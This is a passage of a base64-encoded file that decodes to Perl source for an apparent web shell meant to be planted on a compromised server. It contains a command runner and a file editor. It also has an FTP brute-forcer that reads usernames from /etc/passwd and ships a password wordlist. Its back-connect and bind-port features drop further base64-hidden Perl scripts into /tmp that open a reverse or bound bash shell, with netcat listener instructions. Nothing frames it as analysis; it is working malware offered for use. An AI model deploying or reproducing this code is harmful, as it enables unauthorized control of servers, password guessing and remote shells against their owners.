bW1hbmQuJFJlZGlyZWN0b3I7DQoJaWYoISRXaW5OVCkNCgl7DQoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsNCgl9DQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCXsNCgkJJHw9MTsNCgkJJENvbW1hbmQgLj0gIiB8IjsNCgkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikNCgkJew0KCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCIkX1xuIik7DQoJCX0NCgkJJHw9MDsNCgl9DQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJew0KCQkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCckQ29tbWFuZCcpOw0KCX0NCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBGb3JtIFNhdmUgRmlsZSANCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBTYXZlRmlsZUZvcm0NCnsNCglteSAkcmVzdWx0ID0iIjsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7DQoJbXkgJGRpcj0iPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7DQoJaWYoLXcgJEZpbGUpDQoJew0KCQkkcm93cz0iMjMiDQoJfWVsc2UNCgl7DQoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hOyBjb2xvcjogeWVsbG93OycgPiBQZXJtaXNzaW9uIGRlbmllZCE8Zm9udD48YnI+IjsNCgkJJHJvd3M9IjIwIg0KCX0NCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsNCgkkUnVuQ29tbWFuZCA9ICIkcmVhZCBcIiRSdW5Db21tYW5kXCIiOw0KCSRyZXN1bHQgLj0gIDw8RU5EOw0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCgkkUHJvbXB0DQoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4NCgk8aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnDQoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+DQpFTkQNCgkNCgkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCgkkcmVzdWx0IC49ICAiPC9mb3JtPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIFNhdmUgRmlsZQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlKCQpDQp7DQoJbXkgJERhdGE9IHNoaWZ0IDsNCglteSAkRmlsZT0gc2hpZnQ7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJEZpbGU7DQoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpDQoJew0KCQliaW5tb2RlIEZJTEU7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXJldHVybiAxOw0KCX1lbHNlDQoJew0KCQlyZXR1cm4gMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlciBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXJGb3JtDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkcmVzdWx0IC49IDw8RU5EOw0KDQo8dGFibGU+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzxicj4NClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJydXRlZm9yY2VyIi8+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD5Vc2VyOjxicj48dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJ1c2VyIj4NCkVORA0KY2hvcCgkcmVzdWx0IC49IGBsZXNzIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjFgKTsNCiRyZXN1bHQgLj0gPDwnRU5EJzsNCjwvdGV4dGFyZWE+PC90ZD4NCjx0ZD4NCg0KUGFzczo8YnI+DQo8dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJwYXNzIj4xMjNwYXNzDQoxMjMhQCMNCjEyM2FkbWluDQoxMjNhYmMNCjEyMzQ1NmFkbWluDQoxMjM0NTU0MzIxDQoxMjM0NDMyMQ0KcGFzczEyMw0KYWRtaW4NCmFkbWluY3ANCmFkbWluaXN0cmF0b3INCm1hdGtoYXUNCnBhc3NhZG1pbg0KcEBzc3dvcmQNCnBAc3N3MHJkDQpwYXNzd29yZA0KMTIzNDU2DQoxMjM0NTY3DQoxMjM0NTY3OA0KMTIzNDU2Nzg5DQoxMjM0NTY3ODkwDQoxMTExMTENCjAwMDAwMA0KMjIyMjIyDQozMzMzMzMNCjQ0NDQ0NA0KNTU1NTU1DQo2NjY2NjYNCjc3Nzc3Nw0KODg4ODg4DQo5OTk5OTkNCjEyMzEyMw0KMjM0MjM0DQozNDUzNDUNCjQ1NjQ1Ng0KNTY3NTY3DQo2Nzg2NzgNCjc4OTc4OQ0KMTIzMzIxDQo0NTY2NTQNCjY1NDMyMQ0KNzY1NDMyMQ0KODc2NTQzMjENCjk4NzY1NDMyMQ0KMDk4NzY1NDMyMQ0KYWRtaW4xMjMNCmFkbWluMTIzNDU2DQphYmNkZWYNCmFiY2FiYw0KIUAjIUAjDQohQCMkJV4NCiFAIyQlXiYqKA0KIUAjJCQjQCENCmFiYzEyMw0KYW5oeWV1ZW0NCmlsb3ZleW91PC90ZXh0YXJlYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KU2xlZXA6PHNlbGVjdCBuYW1lPSJzbGVlcCI+DQoNCjxvcHRpb24+MDwvb3B0aW9uPg0KPG9wdGlvbj4xPC9vcHRpb24+DQo8b3B0aW9uPjI8L29wdGlvbj4NCg0KPG9wdGlvbj4zPC9vcHRpb24+DQo8L3NlbGVjdD4gDQo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPg0KPC9mb3JtPg0KPC90YWJsZT4NCkVORA0KcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJydXRlRm9yY2VyDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307DQoJaWYoJGlueyd1c2VyJ30gZXEgIiIpDQoJew0KCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07DQoJfWVsc2UNCgl7DQoJCXVzZSBOZXQ6OkZUUDsgDQoJCUB1c2VyPSBzcGxpdCgvXG4vLCAkaW57J3VzZXInfSk7DQoJCUBwYXNzPSBzcGxpdCgvXG4vLCAkaW57J3Bhc3MnfSk7DQoJCWNob21wKEB1c2VyKTsNCgkJY2hvbXAoQHBhc3MpOw0KCQkkcmVzdWx0IC49ICI8YnI+PGJyPlsrXSBUcnlpbmcgYnJ1dGUgJFNlcnZlck5hbWU8YnI+PT09PT09PT09PT09PT09PT09PT0+Pj4+Pj4+Pj4+Pj48PDw8PDw8PDw8PT09PT09PT09PT09PT09PT09PT08YnI+PGJyPlxuIjsNCgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQ0KCQl7DQoJCQlpZighKCR1c2VybmFtZSBlcSAiIikpDQoJCQl7DQoJCQkJZm9yZWFjaCAkcGFzc3dvcmQgKEBwYXNzKQ0KCQkJCXsNCgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgDQoJCQkJCWlmKCRmdHAtPmxvZ2luKCIkdXNlcm5hbWUiLCIkcGFzc3dvcmQiKSkNCgkJCQkJew0KCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7DQoJCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJCQlicmVhazsNCgkJCQkJfQ0KCQkJCQlpZighKCRpbnsnc2xlZXAnfSBlcSAiMCIpKQ0KCQkJCQl7DQoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI3IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENsaWVudCBsaXN0ZW4gYmVmb3JlIGNvbm5lY3QgYmFjayENCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+DQoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJUSElFVUdJQUJVT04iPjwvdGQ+DQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2h1YyBuYW5nIGNodWEgZGMgdGVzdCENCgk8YnI+WytdIFRyeSBjb21tYW5kOiA8cnVuPm5jICRFTlZ7J1NFUlZFUl9BRERSJ30gPHNwYW4gaWQ9ImJpIj4xNDEyPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPjxicj4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCB1c2UgcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJhY2tCaW5kDQp7DQoJdXNlIE1JTUU6OkJhc2U2NDsNCgl1c2UgU29ja2V0OwkNCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7DQoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsNCg0KCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307DQoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOw0KCWlmKCRDbGllbnRQb3J0IGVxIDApDQoJew0KCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsNCgl9ZWxzaWYoISRDbGllbnRBZGRyIGVxICIiKQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOw0KCQlpZigtdyAiL3RtcC8iKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX1lbHNlDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiaW5kcGVybCk7DQoJCWlmKC13ICIvdG1wIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmluZHBvcnQucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJpbmRwb3J0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsIGJpbmRwb3J0LnBsICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojICBBcnJheSBMaXN0IERpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJtRGlyKCQpIA0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkNCgl7DQoJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQl7DQoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpDQoJCQl7DQoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7DQoJCQkJaWYoLWQgJGZpbGUpDQoJCQkJew0KCQkJCQkmUm1EaXIoJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQl1bmxpbmsoJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQljbG9zZWRpcihESVIpOw0KCX0NCglpZighcm1kaXIoJGRpcikpDQoJew0KCQkNCgl9DQp9DQpzdWIgRmlsZU93bmVyKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZSAkZmlsZSkNCgl7DQoJCSgkdWlkLCRnaWQpID0gKHN0YXQoJGZpbGUpKVs0LDVdOw0KCQlpZigkV2luTlQpDQoJCXsNCgkJCXJldHVybiAiPz8/IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOw0KCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOw0KCQkJcmV0dXJuICRuYW1lLiIvIi4kZ3JvdXA7DQoJCX0NCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIFBhcmVudEZvbGRlcigkKQ0Kew0KCW15ICRwYXRoID0gc2hpZnQ7DQoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOw0KCWNob3AoJHBhdGggPSBgJENvbW1gKTsNCglyZXR1cm4gJHBhdGg7DQp9DQpzdWIgRmlsZVBlcm1zKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglteSAkdXIgPSAiLSI7DQoJbXkgJHV3ID0gIi0iOw0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQlpZigtciAkZmlsZSl7ICR1ciA9ICJyIjsgfQ0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0NCgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsNCgkJfWVsc2UNCgkJew0KCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsNCgkJCSRyZXN1bHQgPSBzcHJpbnRmKCIlMDRvIiwgJG1vZGUgJiAwNzc3Nyk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfQ0KCX0NCglyZXR1cm4gIjAwMDAiOw0KfQ0Kc3ViIEZpbGVMYXN0TW9kaWZpZWQoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOw0KCQkoJGQsJG0sJHksJGgsJGkpID0gKGxvY2FsdGltZSgkbGEpKVszLDQsNSwyLDFdOw0KCQkkeSA9ICR5ICsgMTkwMDsNCgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOw0KCQkkbG10aW1lID0gc3ByaW50ZigiJTAyZC8lcy8lNGQgJTAyZDolMDJkIiwkZCwkbW9udGhbJG1dLCR5LCRoLCRpKTsNCgkJcmV0dXJuICRsbXRpbWU7DQoJfQ0KCXJldHVybiAiPz8/IjsNCn0NCnN1YiBGaWxlU2l6ZSgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWYgJGZpbGUpDQoJew0KCQlyZXR1cm4gLXMgJGZpbGU7DQoJfQ0KCXJldHVybiAiMCI7DQoNCn0NCnN1YiBQYXJzZUZpbGVTaXplKCQpDQp7DQoJbXkgJHNpemUgPSBzaGlmdDsNCglpZigkc2l6ZSA8PSAxMDI0KQ0KCXsNCgkJcmV0dXJuICRzaXplLiAiIEIiOw0KCX0NCgllbHNlDQoJew0KCQlpZigkc2l6ZSA8PSAxMDI0KjEwMjQpIA0KCQl7DQoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMDJmIiwkc2l6ZSAvIDEwMjQpOw0KCQk